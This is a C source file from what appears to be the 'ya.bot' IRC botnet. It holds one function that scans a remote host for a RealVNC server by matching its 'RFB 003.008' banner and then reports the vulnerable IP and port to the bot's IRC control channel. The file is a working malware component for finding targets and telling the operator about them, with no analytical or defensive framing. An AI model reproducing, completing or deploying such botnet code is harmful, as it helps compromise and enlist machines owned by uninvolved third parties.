/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_EXPSCAN
#ifndef NO_EXPSCANREALVNC
bool expscan_realvnc(SExpScanInfo s_esi)
{
	char szBuffer[IRCBUF];

#ifndef NO_DEBUG
		debug_print("Exploit scanning RealVNC, expscan_realvnc()");
#endif

	if (s_esi.m_csock == INVALID_SOCKET)
			return FALSE;
	if (expscan_recv(s_esi.m_csock, szBuffer, sizeof(szBuffer) - 1, 0) == SOCKET_ERROR)
			return FALSE;
	if (!strstr(szBuffer, "RFB 003.008"))
			return FALSE;
	if (!s_esi.m_bSilent)
			irc_message(s_esi.m_bsock, (char *)string_ircprivmsg, s_esi.m_szResultChannel,
					(char *)string_expscanrealvncfound,
					CGREEN, string_replyexpscan, CEND, string_replydotbot,
					CBLUE, CEND, s_esi.m_szIP, s_esi.m_nPort);
		return TRUE;
}
#endif
#endif